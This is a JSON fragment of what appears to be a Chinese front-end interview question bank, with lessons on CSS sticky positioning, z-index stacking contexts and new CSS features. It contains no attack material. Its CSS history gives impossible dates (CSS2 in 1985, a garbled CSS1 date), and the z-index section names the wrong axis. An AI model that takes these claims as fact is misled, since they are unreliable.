    "testPoint": "### 1. **`position: sticky` 的基本概念**\n   - `position: sticky` 是什么？如何解释它的“粘性”效果？\n   - 它与 `position: relative` 和 `position: fixed` 有什么不同？\n\n### 2. **`position: sticky` 的工作原理**\n   - `position: sticky` 的工作条件是什么？它如何在滚动容器中保持“相对位置”并在到达指定阈值后变为“固定”？\n   - **触发条件**：`position: sticky` 生效需要满足的条件是什么（例如父容器不能有 `overflow: hidden`）？\n\n### 3. **粘性定位的阈值**\n   - 如何使用 `top`、`bottom`、`left`、`right` 等属性设置 `position: sticky` 的粘性阈值？\n   - 如果一个元素 `position: sticky; top: 20px;`，那么它在什么条件下会固定在距离容器顶部 20px 处？\n\n### 4. **`position: sticky` 的应用场景**\n   - 在项目中，如何利用 `position: sticky` 实现表头在滚动列表中固定的效果？\n   - **导航栏**：如何使用 `position: sticky` 创建一个页面滚动时固定在顶部的导航栏？\n   - **页面内标题**：在长文档中，如何使标题在页面滚动到该位置时保持粘性，提升可读性？\n\n### 5. **代码示例**\n   - 给定代码示例，考察面试者对 `position: sticky` 的理解和调试能力。\n   - 示例代码：\n     ```html\n     <div class=\"container\">\n       <h2 class=\"sticky-header\">Sticky Header</h2>\n       <p>Some content...</p>\n       <p>Some content...</p>\n       <p>Some content...</p>\n       <p>Some content...</p>\n     </div>\n     ```\n     ```css\n     .container {\n       height: 500px;\n       overflow-y: scroll;\n     }\n     .sticky-header {\n       position: sticky;\n       top: 0;\n       background: yellow;\n     }\n     ```\n   - 问题：为什么这个标题在滚动时会“粘”在顶部？如何通过 CSS 调整粘性生效的滚动范围？\n\n### 6. **`position: sticky` 的局限性**\n   - 在什么情况下 `position: sticky` 可能无法生效？\n     - 例如：父元素设置了 `overflow: hidden`、元素没有在一个滚动容器内。\n   - **兼容性**：哪些浏览器对 `position: sticky` 的支持不佳？如何在不支持的浏览器中实现类似效果？\n\n### 7. **`position: sticky` 的性能**\n   - 使用 `position: sticky` 是否会对页面性能产生影响？在长列表或复杂布局中应如何优化？\n\n### 8. **`position: sticky` 与 JavaScript 的结合**\n   - 如何结合 JavaScript 监听粘性元素的状态，实现更复杂的交互效果？例如在元素变粘性时触发特定动画。\n\n### 9. **`position: sticky` 在响应式设计中的应用**\n   - 在不同屏幕宽度下，如何使用媒体查询控制 `position: sticky` 的粘性行为？\n",
    "exerciseKeyList": "[\"65bb22ac-b04c-401a-b6d3-8b05f5d16422\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 7,
    "createAt": "2024-11-09T03:10:03.000Z",
    "updateAt": "2024-11-10T05:42:05.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "65bb22ac-b04c-401a-b6d3-8b05f5d16422",
        "title": "position 的 sticky 有什么应用场景？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-11-09T03:09:43.000Z",
        "updateAt": "2024-11-09T03:09:46.000Z"
      }
    ]
  },
  "164": {
    "id": 164,
    "tagId": 11,
    "title": "z-index",
    "explanation": "大家可能觉得，`z-index` 是一个很简单的属性，你给它设置哪个值，元素就会位于 `y` 轴的哪个位置。但它实际上并没有我们想象的这么简单，这个属性背后是一系列决定元素所在层级的规则。\n\n在进行今天的介绍前，我们先列出三个问题，如果你能一眼看出它们的解决方案，那么恭喜你掌握了`z-index`，也就不需要阅读本文了；如果不行，那么耐心看完本文，相信能找到答案。\n\n## 三个自测问题\n\n* 问题一：为什么`z-index` 数值更大，但 `Content` 没有在 `Box 2` 之上？\n\n```html\n<div id=\"box1\">\n    Box 1\n</div>\n\n<div id=\"content\">\n    Content <br/>\n    z-index: 2;\n</div>\n\n<div id=\"box2\">\n    Box 2 <br/>\n    z-index: 1;\n</div>\n```\n\n\n```css\ndiv {\n    padding: 25px;\n    font-size: larger;\n}\n\n#box1 {\n    background-color: chocolate;\n    width: 200px;\n    height: 100px;\n    margin-bottom: -50px;\n}\n\n#content {\n    background-color: gold;\n    width: 300px;\n    height: 200px;\n    z-index: 2;\n}\n\n#box2 {\n    background-color: cyan;\n    width: 200px;\n    height: 100px;\n    margin-top: -50px;\n    z-index: 1;\n}\n```\n\n![](https://static.ecool.fun//article/98bc8d47-76ca-4511-ba39-b7d2a87eaed1.png)\n\n* 问题二：明明 `z-index` 数值更小，为什么 `Content` 这次反而在`Box 2` 之上了？\n\n```html\n<div id=\"box1\">\n    Box 1\n</div>\n\n<div id=\"content\">\n    Content <br/>\n    transform: rotate(90deg); <br/>\n    z-index: 1;\n</div>\n\n<div id=\"box2\">\n    <br/>\n    Box 2 <br/>\n    z-index: 2;\n</div>\n\n```\n\n```css\ndiv {\n    padding: 25px;\n    font-size: larger;\n}\n\n#box1 {\n    background-color: chocolate;\n    width: 200px;\n    height: 100px;\n    margin-bottom: -10px;\n}\n\n#content {\n    background-color: gold;\n    width: 250px;\n    height: 200px;\n    z-index: 1;\n    transform: rotate(90deg);\n}\n\n#box2 {\n    background-color: cyan;\n    width: 200px;\n    height: 100px;\n    margin-top: -10px;\n    z-index: 2;\n}\n```\n\n![](https://static.ecool.fun//article/448f879d-8b4c-431a-8533-563d4dc187f2.png)\n\n* 问题三：为什么明明 `z-index` 是最大的，但`Box 2-3` 在 `Content` 之下？\n\n```html\n<div id=\"box1\">\n    Box 1\n</div>\n\n<div id=\"content\">\n    Content <br/>\n    z-index: 2; <br/>\n    position: relative;\n</div>\n\n<div id=\"box2\">\n    <br/><br/>\n    Box 2 <br/>\n    z-index: 1; <br/>\n    position: relative;\n    <div id=\"box2-3\">\n        Box 2-3 <br/>\n        z-index: 5;  <br/>\n        position: absolute;\n    </div>\n</div>\n```\n\n```css\ndiv {\n    padding: 25px;\n    font-size: larger;\n}\n\n#box1 {\n    background-color: chocolate;\n    width: 200px;\n    height: 100px;\n    margin-bottom: -50px;\n}\n\n#content {\n    background-color: gold;\n    width: 200px;\n    height: 100px;\n    margin-left: 50px;\n    z-index: 2;\n    position: relative;\n}\n\n#box2 {\n    background-color: cyan;\n    width: 200px;\n    height: 100px;\n    margin-top: -50px;\n    z-index: 1;\n    position: relative;\n}\n\n#box2-3 {\n    background-color: green;\n    width: 200px;\n    height: 100px;\n    padding-left: 150px;\n    left: 180px;\n    top: -50px;\n    z-index: 5;\n    position: absolute;\n}\n```\n\n\n![](https://static.ecool.fun//article/874f702e-53a4-4acc-a680-dee2a16844e5.png)\n\n\n## z-index 简介\n\n没有使用 `z-index` 的时候，元素的层叠关系由2个因素决定：\n\n* 该元素的`position`是否是`static`，如果是`static`，那么这个元素就称为 `non-positioned` ；反之，如果 `position` 值是 `relative`, `absolute`, `fixed`, 或 `sticky` 则称 `positioned`。`positioned` 元素享受特权，会覆盖 `non-positioned` 元素。而 `non-positioned` 元素中，有 `float`样式的元素覆盖没有 `float` 的。\n* 元素的“出场”顺序 —— 即在html中的顺序，同类型元素遵循后来者居上的原则。\n\n`z-index` 属性设定了一个定位元素及其后代元素或 `flex` 项目的 `z-order`。当元素之间重叠的时候，`z-index` 较大的元素会覆盖较小的元素在上层进行显示。\n\n所谓 `z-index`，只有在以下场景适用。分别为：\n\n* 首先，`z-index`这个属性并不是在所有的元素上都有效果。它仅仅只在 `positioned` 元素上有效果。\n* 要判断元素在 `z轴` 上的堆叠顺序，并不仅仅是直接比较两个元素的 z-index 值的大小，同时，这个堆叠顺序还由元素的层叠上下文和层叠等级共同决定。\n\n## 层叠上下文\n\n`z-index` 存在的一个背景是 `Stacking Context` ，中文常译作层叠上下文（其实数据结构中的栈的单词也是 stack，所以层叠上下文中已经蕴含了后来者居上的意思）。\n\n层叠上下文，是HTML中一个三维的概念。在 `CSS2.1` 规范中，每个盒模型的位置是三维的，分别是平面画布上的`X轴`，`Y轴`以及表示层叠的`Z轴`。\n\n一般情况下，元素在页面上沿 `X轴` 和 `Y轴` 平铺，我们是察觉不到它们在`Z轴`上的层叠关系。而一旦元素发生堆叠，这时就能发现某个元素可能覆盖了另一个元素或者被另一个元素覆盖。\n\n如果一个元素含有层叠上下文，(也就是说它是层叠上下文元素)，我们可以理解为这个元素在Z轴上就“高人一等”，最终表现就是它离屏幕观察者更近。\n\n![](https://static.ecool.fun//article/f67a1529-d826-45ed-8b20-70186630907e.png)\n\n构建层叠上下文和**盖楼**比较类似：\n\n首先， `<html>` 元素是地平线或地基 —— 所有楼都是从地基开始盖的\n\n接下来，每产生一个层叠上下文，相当于盖一座楼， z-index 的值相当于楼的高度\n\n以下几种元素可以产生层叠上下文：\n\n* 元素的 `position` 值为 `absolute` 或 `relative`， 且 `z-index` 值不为 `auto` （默认值）.\n* 元素的 `position` 值为 `fixed` 或 `sticky`\n* 元素是 `flexbox` 容器的子元素， 且 `z-index` 值不为 `auto` （默认值）\n* 元素是 `grid` 容器的子元素, 且 `z-index` 值不为 `auto` （默认值）\n* 元素有 `opacity` 值且值小于 1.\n* 元素有以下任意一项的值，且值不为 `none` :\n  * `transform`\n  * `filter`\n  * `perspective`\n  * `clip-path`\n  * `mask / mask-image / mask-border`\n* 元素有 `isolation` 值且值为 `isolate`.\n* 元素有 `mix-blend-mode` 值且值不为 `normal`.\n* 元素有 `-webkit-overflow-scrolling` 值且值为 `touch`.\n* 其他几种冷门的情况\n\n第三，层叠上下文是**可以嵌套**的 —— 这是最容易让人误解的一块。\n\n嵌套，顾名思义就是在一个 `层叠上下文` 中能创建 `另一个层叠上下文`。\n\n假如在地基上盖一座50米高的楼（即 `z-index: 50`), 是否可以在楼里再盖一栋 100米高的楼中楼呢？\n\n当然不可能！但是你可以在这座楼里建一座 `100` 级阶梯高的大堂。 \n\n换句话说，在嵌套的层叠上下文中，子层叠上下文被限制在了父层叠上下文中，它们的 `z-index` “单位”已经不一样了（`z-index` 没有单位，这边只是用于理解），无论子层叠上下文的 `z-index` 值有多大都无法突破父层叠上下文的高度。\n\n层叠上下文小结：\n\n* <html> 元素的第一级层叠上下文\n* 特定样式的元素可以产生新的层叠上下文，且z-index的值在这些元素中才有效\n* 子层叠上下文的“高度”被限制在了父层叠上下文中\n* 在同级层叠上下文中，没有（有效） z-index 的元素依然遵循上一小节的规律；z-index 值相同的元素遵循后来者居上原则。\n\n需要注意：`层叠上下文嵌套` 与 `元素嵌套` 不是一一对应的关系，一个元素所处的父层叠上下文是由内向外找到的第一个能产生层叠上下文的元素所产生的层叠上下文。\n  \n看个例子便于理解：\n```css\n<div id=\"div1\" style=\"position: relative; z-index: 1\">\n  <div id=\"div2\" style=\"position: relative; z-index: 1\">\n      所处的父层叠上下文是 div1 产生的层叠上下文\n  </div>\n\n  <div id=\"div3\">\n      <div id=\"div4\" style=\"position: relative; z-index: 2\">\n          所处的父层叠上下文也是 div1 产生的层叠上下文\n      </div>\n  </div>\n</div>\n```\n  \n虽然 `div4` 外面还有层 `div3`，但是由于 `div3` 不能产生层叠上下文，所以 `div4` 所处的父层叠上下文也是 `div1` （产生的层叠上下文） —— 虽然在`html`元素层级中 `div4` 比 `div2` 更深了一级，但是 `div4` 与 `div2` 在层叠上下文层面上是同级的，因此它们可以相互比较 `z-index` 值来决定谁在上面。\n\n## 三个问题的解答\n\n学习完上面的 `z-index` 相关知识点，我们来回答开头提出的三个问题。\n\n* 第一个问题中 `z-index` 不生效的原因在于这三个元素都不能产生层叠上下文，因此`z-index`值对它们不生效 —— 根据出场顺序决定了 `Content` 处在 `Box 2` 之下。\n\n* 第二个问题的 `Box 2`不能产生层叠上下文，因此`z-index`同样是无效的；`Content` 因为使用了 `transform` 属性，产生了层叠上下文，相当于盖了一座 1 米高的楼（ `z-index: 1` )\n\n* `Box 2` 与 `Content` 在同一级层叠上下文中，且`Box 2` 的 `z-index` 比较小, 因此 `Box 2` 在 `Content` 之下；且 `Box 2-3` 在 `Box 2`的层叠上下文下新建了个子层叠上下文，因此`Box 2-3`的高度被限制在了 `Box 2` 之内，因此 `Box 2-3` 的 `z-index` 再高也没用。\n\n  \n\n\n\n\n\n",
    "testPoint": "### 1. **`z-index` 的基本概念**\n   - `z-index` 是什么？它的作用是什么？\n   - `z-index` 值越大，元素的显示层次越高。如何解释这一特性？\n\n### 2. **`z-index` 的工作原理**\n   - `z-index` 对哪些定位的元素生效？默认情况下，哪些元素可以使用 `z-index`？\n     - 必须是非静态定位的元素，例如 `position: relative`、`absolute`、`fixed`、`sticky`。\n   - `z-index` 的默认值是多少？如果不设置 `z-index`，元素的默认层级关系如何确定？\n\n### 3. **堆叠上下文（Stacking Context）**\n   - 什么是堆叠上下文？如何理解堆叠上下文对 `z-index` 的影响？\n   - 创建新的堆叠上下文的条件有哪些？\n     - 例如 `position: relative` 或 `absolute` 的元素设置 `z-index` 值；\n     - `opacity` 值小于 1；\n     - `transform` 属性不为 `none`；\n     - CSS 属性 `filter`、`perspective`、`clip-path`、`mask` 等等。\n   - 嵌套的堆叠上下文如何影响 `z-index`？如何解决层级问题？\n\n### 4. **`z-index` 的值**\n   - `z-index` 的数值单位？`z-index` 是否可以为负值？如果设置负值，会带来哪些效果？\n   - 如果两个元素的 `z-index` 值相同，它们的层级顺序如何决定？（按 HTML 中的顺序，后出现的覆盖先出现的）\n\n### 5. **实际应用与问题解决**\n   - **悬浮菜单**：如何用 `z-index` 让悬浮菜单或模态框始终显示在页面最上层？\n   - **层级问题**：当 `z-index` 值设置后仍然无法生效，可能的原因是什么？如何定位和解决这些问题？\n     - 举例：如果父元素创建了新的堆叠上下文，而子元素 `z-index` 值再高也无法超出该父元素的层级限制。\n   - **层级调试**：在复杂页面中，如何利用浏览器的开发者工具调试 `z-index` 带来的层级问题？\n\n### 6. **代码示例**\n   - 给出代码示例，让面试者分析 `z-index` 层级显示效果。\n   - 示例代码：\n     ```html\n     <div class=\"parent1\">\n       <div class=\"child\">Child 1</div>\n     </div>\n     <div class=\"parent2\">\n       <div class=\"child\">Child 2</div>\n     </div>\n     ```\n     ```css\n     .parent1 {\n       position: relative;\n       z-index: 1;\n     }\n     .parent2 {\n       position: relative;\n       z-index: 2;\n     }\n     .child {\n       position: absolute;\n       z-index: 10;\n     }\n     ```\n   - 问题：`child` 元素的 `z-index` 为什么在页面中仍然显示在 `parent1` 的后面？\n\n### 7. **`z-index` 的应用场景**\n   - **模态框**：如何确保模态框在页面中的最顶层，且不会被其他元素遮挡？\n   - **下拉菜单与悬停效果**：在下拉菜单、悬停效果中使用 `z-index` 处理重叠问题。\n   - **响应式布局中的 `z-index`**：在小屏幕上如何使用 `z-index` 优化视觉层级效果？\n\n### 8. **`z-index` 与 JavaScript 的结合**\n   - 如何利用 JavaScript 动态修改元素的 `z-index`，实现切换、拖拽等交互效果？\n   - 当用户点击某个元素时，使其“置顶”，如何在 JavaScript 中实现？\n\n### 9. **`z-index` 的性能与兼容性**\n   - `z-index` 的使用会不会影响页面渲染性能？在大量元素的页面中如何优化？\n   - 兼容性问题：是否有一些低版本的浏览器对堆叠上下文的支持不佳？如何解决？\n\n### 10. **常见的 `z-index` 错误**\n   - 元素的 `z-index` 设置无效的常见原因有哪些？（例如，未触发堆叠上下文）\n   - 如何使用 `z-index` 实现具有透明度的重叠效果，而不影响内容可见性？",
    "exerciseKeyList": "[\"e1900c3f-a1e8-426c-8f5c-3281129e1430\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 9,
    "createAt": "2024-11-09T03:12:43.000Z",
    "updateAt": "2024-11-10T05:42:05.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "e1900c3f-a1e8-426c-8f5c-3281129e1430",
        "title": "z-index属性在什么情况下会失效？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-06-25T06:21:37.000Z",
        "updateAt": "2024-08-10T17:06:46.000Z"
      }
    ]
  },
  "165": {
    "id": 165,
    "tagId": 11,
    "title": "新变化",
    "explanation": "## CSS 发展史\n\n![](https://static.ecool.fun//article/b833535f-5e0b-467c-89fd-75c1ee5e60e2.png)\n\n上图是20 世纪 90 年万维网刚出现时，由于当时并没有可以装饰网页的方法，原始的 Web 页面呈现的效果，随着 CSS（层叠样式表，Cascading Style Sheets）的诞生与发展，Web页面的样式有了翻天覆地的变化。\n\n## CSS的发布过程\n\n![](https://static.ecool.fun//article/e9fbb1fd-1a00-4391-8761-c74b83031dca.png)\n\n\n1. CSS1.0\n19912月W3C发布了第一个有关样式的标准CSS1.0。这个版本中，已经包含了的相关font的相关属性、颜色与背景的相关属性、文字的相关属性、box的相关属性等。\n2. CSS2.0\n1985年5月，CSS2.0正式推出。这个版本推荐的是内容和表现效果分离的方式，并开始使用样式表结构。\n3. CSS2.1\n2004年2月，CSS2.1正式推出。它在CSS2.0的基础上略微做了改动，删除了许多不被浏览器支持的属性\n4. CSS3\n从2011年开始CSS被分为多个模块单独升级。这些模块统称为CSS3\n包含有：\n- CSS 选择器level3\n- CSS 媒体查询level3\n- CSS color level3\n5. CSS4\n设计中\n\nCSS 标准的制定大概有下面几个步骤\n\n![](https://static.ecool.fun//article/d6c70a01-f986-400d-b4a2-dad1af9a87b7.png)\n\n------\n\n下面主要介绍的是与我们日常工作有关联的一些新特性，其中一些已经在主流浏览器中得到了支持，还有一些特性还在草案阶段，可能还会有一些变化。\n\n## CSS 伪类选择器\n\n### is()和where()\n\n在编写css时，有时会需要使用很长的选择器列表来定位具有相同样式的子元素，比如对所有H元素下的span设置为block，之前会这么写:\n\n![](https://static.ecool.fun//article/53a3b56f-2153-4c83-8052-113f2c363d76.png)\n\n\n这样写选择器看起来很长，可读性差。\n此时，可以使用is()来提高易读性，同时避免使用长选择器\n\n![](https://static.ecool.fun//article/29a1c9ee-79c1-4785-aa96-975f1a27acaa.png)\n\n浏览器支持:\n- :is()  Chrome 88/ Firefox 78/ Edge 88 /Safari 14\n- :where() Chrome 88/ Firefox 78/ Edge 88 /Safari 14\n\n注意：\n1. is()和where()在使用方法上和其他的伪类选择器一样，可以任意组合排列。\n2. is()和where()的功能大体上是一样的，他们的差异性体现在选择器的权重上\n  - where()选择器没有权重，也就是权重是0\n  - is()选择器的权重由它的选择器列表中的最搞权重决定\n  \n规则示例:\n\n![](https://static.ecool.fun//article/f80c22c2-0dcc-478d-8aeb-0f5edc891e16.png)\n\n\n### has()\nhas()选择器一般被描述为\"父选择器\"，它接受一个相对的选择器列表，如果至少有一个其他元素与列表中的选择器相匹配，那么它将代表这一个元素。\n\n它的使用方法如下:\n\n![](https://static.ecool.fun//article/ef6b7e95-f153-45d8-88a5-1a3b1309c7d8.png)\n\n这个选择器的意思是，如果parent元素下有child元素，则选中parent,这也是为什么可以称它为\"父选择器\"\n\n注意：\n\nhas()选择器的权重和is()选择器一样，都由它的选择器列表中权重最高的选择器决定\n\n![](https://static.ecool.fun//article/a733a218-9fbd-4a5a-b386-0e944b3edea6.png)\n\n浏览器支持:\n\n这个选择器目前只有Safari支持，且需要在实验性功能中手动开启\n- Safari 15.4\n\n---\n\n## CSS 颜色\n\n### hwb()\n\nHWB是一种新的颜色定义函数，它的三个值分别代表色调、白度和黑度。它是一种更人性化的表达颜色的方式，因为它只是一种色调和一定量的白色或黑色来变亮或变暗\n\nhwb()颜色函数产生的颜色也是来自sRGB颜色空间，所以它不会产生新的颜色\n\n浏览器支持:\n- Chrome 101/ Firefox 96/ Edge 101 /Safari 15\n\nlch, oklch, lab, oklab, display-p3 等新的颜色空间\n2022 年的CSS将提供10个新的颜色空间，每个空间都具有独特的功能，它们相对于sRGB颜色空间能带来更丰富的色彩显示\n\n![](https://static.ecool.fun//article/925cdf55-828a-48c2-8da7-bd6167830726.png)\n\n\n浏览器支持:\n- Safari *\n\n### color-mix()\n\ncolor-mix() 函数接受两个 <color> 值，并在给定的颜色空间中以指定的混合度返回它们混合的结果\n  \n![](https://static.ecool.fun//article/306e0d61-0b05-4014-a681-7e15041e0825.png)\n\n浏览器支持:\n- Safari */Firefox *\n\n* color-contrast()\n  \n从颜色列表中，输出与第一个参数相比对比度最高的颜色\n\n![](https://static.ecool.fun//article/7febfbfc-bae1-4549-a068-f6d6e0ddd717.png)\n\n浏览器支持:\n- Safari *\n\n### Relative color \n  \nRelative color 相当于对色彩通道的解构，并且能够修改通道的值，形成一个新的颜色\n  \n![](https://static.ecool.fun//article/a6b2d771-a14a-4d20-9a37-1cd99715f4af.png)\n\n\n浏览器支持:\n- Safari 15\n\n### accent-color\n  \naccent-color 可以用来修改内置组件的颜色,并且浏览器能够根据系统的颜色方案(黑白模式)，智能的匹配对比色\n目前支持修改的内置组件包括\n  \n```html\n  - <input type=\"checkbox\">\n  - <input type=\"radio\">\n  - <input type=\"range\">\n  - <progress>\n```\n  \n它的使用语法如下\n  \n  \n![](https://static.ecool.fun//article/db73b1c8-e33f-47ab-bc5c-1142551ae447.png)\n\n\n最终的结果：\n  \n  \n![](https://static.ecool.fun//article/0e75f246-197b-4517-bf48-6d9b1322e0a5.png)\n\n\n浏览器支持:\n- Chrome 93/ Firefox 92/ Edge 93 /Safari 15.4\n\n### 新的颜色定义语法\n  \n原本的 rgb() 、hsl() 以及 #rrggbb 等颜色值定义语法规则也做出调整。比如，原本我们使用\",\"分割不同的颜色通道的值，现在可以使用空格\n  \n![](https://static.ecool.fun//article/a0a784e9-a737-4fee-bc9a-ddb5e698f657.png)\n\n## CSS 语法\n\n### inert\n\ninert是指可以使某些元素变得不可交互，它的效果类似于使用alert()函数后的页面，页面的其他部分都将被冻结，用户只能在指定的部分交互,这个特性在弹框、菜单等交互上可以发挥作用\n  \n![](https://static.ecool.fun//article/4a8e3dc3-7d82-4397-87fd-987bfabe6bc7.png)\n\n浏览器支持：\n- Chrome 102/ Firefox */ Edge 102 /Safari 15.5\n\n### @layer\n  \n@layer是2022最受瞩目的css新特性，在@layer之前，加载样式表的顺序非常重要，因为最后加载的样式会覆盖之前加载的样式，这导致了开发人员需要对入口样式表的做细致的管理，而@layer 级联层提供了一种结构化的方式来组织和平衡单一来源中的CSS规则，并最终决定采用谁的规则。\n  \n使用@layer,开发者可以在样式文件中，预先定义规则的层级顺序从而去控制不同样式之间的优先级，它的语法如下\n  \n![](https://static.ecool.fun//article/0ca85c76-bf0e-497d-b5e6-3963522b271e.png)\n\n由于 @layer B 的顺序排在 @layer A 之后，所以 @layer B 内的所有样式优先级都会比 @layer A 高，即B>A，所以最终 div 的颜色为 green：\n@layer 也支持同时命名多个@layer 层,此时它的优先级以命名时的顺序为准，即A > C > B,最终div的颜色为blue\n\n![](https://static.ecool.fun//article/768c02e6-e83b-40d0-893e-ee9b1e4007f0.png)\n\n利用@layer特性，我们可以把样式组织在不同的层级中，利用先后顺序，控制全局样式的优先级\n\n![](https://static.ecool.fun//article/3bad04e8-0c21-4620-8350-037a42b6e6f9.png)\n\n浏览器支持:\n- Chrome 99/ Firefox 97/ Edge 99 /Safari 15.4\n\n### @container \n  \n在响应式布局中，经常使用媒体查询（Media Queries）检测视窗的宽高，实现元素样式的自动调整。而容器查询使我们能够根据其父元素的大小设置元素的样式，它类似于 @media查询，不同之处在于它根据容器的大小而不是视口的大小进行判断。\n  \n它的语法如下:\n\n![](https://static.ecool.fun//article/a094237b-32fb-457c-9a20-63932c72705e.png)\n\n要使用容器查询，需要使用 container 属性（它是 container-type 和 container-name 的缩写）指定一个元素作为容器。container-type 可以是width、height、inline-size、block-size。inline-size 和 block-size 等逻辑属性\n\n### @media\n以往在 @media 规则中写判断条件时使用 min-width 和 max-width 较多，但是这种写法不太直观,有一些理解的成本，现在可以使用更熟悉的数学表达式，也就是使用 > 、>= 、< 或 <= 等数学表达式\n  \n![](https://static.ecool.fun//article/a8138127-77af-4e11-8738-72ba9ed80018.png)\n\n浏览器支持：\n- Chrome 104 / Edge 104 / Firefox 63 \n\n### @scope\n  \n可以使用@scope 将样式限制在指定的上下文中，它的语法如下\n\n![](https://static.ecool.fun//article/6936f6fb-69c2-45c8-b0f0-f050fc748ca9.png)\n\n它等同于\n  \n![](https://static.ecool.fun//article/b8f43b40-5f5d-4e8d-97ae-9e848545741e.png)\n\n但相对于使用父选择器限定范围的方法，@scope有一个特别的特性是它支持作用域划分\n我们可以使用 to 关键词指定@scope的作用域的范围\n  \n![](https://static.ecool.fun//article/63d83ce7-9b3d-41a1-a4f7-8503d4cce7a7.png)\n\n这样，p的样式就只会被应用在.media和.content之间\n\n### @nest\n类似sass或者less等预处理器中的嵌套\n  \n![](https://static.ecool.fun//article/ac99677d-18d4-444a-8825-10c7f06175c6.png)\n\n目前还没有浏览器提供支持，但是可以通过Postcss 的插件来提前使用嵌套语法\n\n### @property\n在目前的css中，css变量已经大量使用，比如\n  \n![](https://static.ecool.fun//article/4540a2cc-b280-469f-b04d-bb792c243965.png)\n\n但如果指定的css变量的值是非法的，比如指定：--xx:red，此时会导致样式失效，@property提供了类似于其他编程语言中的类型定义和默认值，它的用法如下:\n  \n![](https://static.ecool.fun//article/bf7c55a5-d8f9-473f-b09c-6f11d8437c7a.png)\n\n这里指定了 变量--x的类型和默认值，此时如果我们设置了--x:red,浏览器会自动使用它的默认值:0px,确保样式是有效的\n浏览器支持：\n- Chrome 85/ Edge 85 \n\n### @when/@else\n  \n@when/@else 是CSS中的条件规则，类似于其他编程语言中的if/else 逻辑。它可以使编写复杂的媒体查询更加符合逻辑。\n  \n它的语法如下：\n\n![](https://static.ecool.fun//article/e338c617-43f6-4b9e-bc13-782c788f6066.png)\n\n\n## CSS 单位\n\n### lh和rlh\nlh 和 rlh 与 em 和 rem 非常的相似，只不过他们相对的是 line-height 的值计算:\n- lh 相对于元素自己的 line-height 计算\n- rlh 相对于文档根元素（<html> ）的 line-height 计算\n\n### viewport units\n\n![](https://static.ecool.fun//article/f6849a12-681a-4c90-a149-ac2a3c5eb142.png)\n\n\n## 滚动\n\n### Overscroll Behavior\n  \n目前我们在构建弹框的时候，弹框内容过高会出现滚动条，如果body本身也有滚动条，就会有两个滚动条出现，一个是弹框的，一个是body的,默认情况下，里面的滚动条滚到到底部边缘然后再继续滚动的时候，父滚动条会继续跟着滚动,这种默认行为的用户体验会很差\n  \n目前我们会采用一些hack的写法，比如\n\n![](https://static.ecool.fun//article/59de5c69-c13c-4d77-a742-611fb7436a91.png)\n\n但这会不同的设备上表现不太一致,现在我们可以使用 overscroll-behavior 来指定滚动的行为模式\n\n![](https://static.ecool.fun//article/5e1ccf85-ac0f-4871-bdf6-2d1401dc2348.png)\n\n各个关键字词的含义如下：\n- auto：默认值。就是我们默认看到的滚动行为表现，滚动到边缘后继续滚动外部的可滚动容器。\n- contain：默认的滚动溢出行为只会表现在当前元素的内部（例如“反弹”效果或刷新），不会对相邻的滚动区域进行滚动。例如创建了一个浮层，浮层滚动（带弹性效果），但是底层元素不会滚动。\n- none：相邻的滚动区域不会发生滚动，并且会阻止默认的滚动溢出行为。\n当弹窗打开时，在body上添加overscroll-behavior:none，就可以禁用掉body的滚动行为\n  \n浏览器支持\n- Chrome 65/ Edge 79 / Safari  16 / Firefox 52\n\n### Scrollbar-gutter\n在上面提到的打开弹框场景下，如果body本身有滚动条，此时我们给body增加 overflow:hidden ,然后关闭弹框后再取消掉overflow:hidden ，这样就会导致我们的页面出现抖动，因为滚动条会影响页面内容区的宽度。目前我们一般的解决方案是：计算出当前浏览器的滚动条的宽度，然后再打开弹框时，给body一个padding-right 值，这个时候页面就不会出现抖动\n  \n![](https://static.ecool.fun//article/b4cc3acc-70fd-46e7-8494-5f29edb82826.png)\n\n其中：\n- auto：就是默认的表现。没有滚动条的时候，内容尽可能占据宽度，有了滚动条，可用宽度减小。\n- stable：如果 overflow 属性计算值不是 visible，则提前预留好空白区域，这样滚动条出现的时候，整个结构和布局都是稳定的。\n- both-edges：这个是让左右两侧同时预留好空白区域，目的是让局部绝对居中对称。\n  \n浏览器支持\n- Chrome 94/ Edge 94 / Firefox 97\n  \n### Scrollbar Style\n  \n现在我们如果想修改滚动条样式只能通过浏览器的私有属性来定制,现在已经发布了新的规范，我们可以通过 scrollbar-color 和scrollbar-width 来设定滚动条的宽度和颜色，它们的语法如下:\n\n![](https://static.ecool.fun//article/29ce9c61-9f0d-46b0-b4cc-19e6d1d1350a.png)\n\n浏览器支持\n- Firefox 64\n\n## transform\n  \n过去我们一般使用transform来控制CSS 变换，这个属性接受一个或者多个变换函数\n\n![](https://static.ecool.fun//article/af632935-0c52-42d1-a55a-23f8dfa4c938.png)\n\n现在，我们可以直接使用单独的变换函数\n\n![](https://static.ecool.fun//article/9b32ecd4-ada2-4f1b-a409-4dbd9f2350ec.png)\n\n浏览器支持\n- Chrome 104 / Firefox 72 / Edge 104 / Safari  14.1\n\n## CSS 生态\n  \nCSS 经历了 20 多年的发展，从 PC 端到移动端，在前端工程化不断进步的今天，随着CSS的规范不断的完善升级，前端业务复杂度越来越高，带来的工程也越来越庞大，在 CSS 工程化方案上也有了更多的探索。\n  \n### 预处理器\n  \n- Sass、Less\n从前面的CSS新特性可以发现，预处理器中的许多特性正在逐渐被移植到原生CSS中，正如当年的JQuery和现在的JavaScript\n  \n### 框架\n- TailwindCSS\n  \nTailwind CSS是一个CSS原子样式库，它提供了丰富的原子类，以及完善的自定义机制，我们完全可以使用Tailwind 配置出一套符合我们的设计体系的原子类库，强烈推荐使用。\n  \n### CSS-In-JS \n  \n- Styled Components、Emotion CSS\n  \nCSS-In-JS 与React项目可以很好地结合，可以帮我们解决CSS类名的命名问题和状态样式修改的问题，缺点是它有一定的运行时性能损失\n  \n- zero-runtime \n  \n2022年逐渐有一些零运行时的CSS-In-JS 框架出现，这些框架可以让我们使用CSS-In-JS 的语法写样式，但最终生成的还是CSS文件，比如：Linaria、Astroturf、Reshadow’\n\n## 总结\n  \nCSS 经历了 20 多年的发展，从早期的只能修改字体、背景，到现在我们可以充分发挥CSS的各种特性，为用户创造丰富多彩、交互体验优秀的Web应用，CSS可以说取得了很大的成功。同时，CSS自身也还在不断的完善，CSS 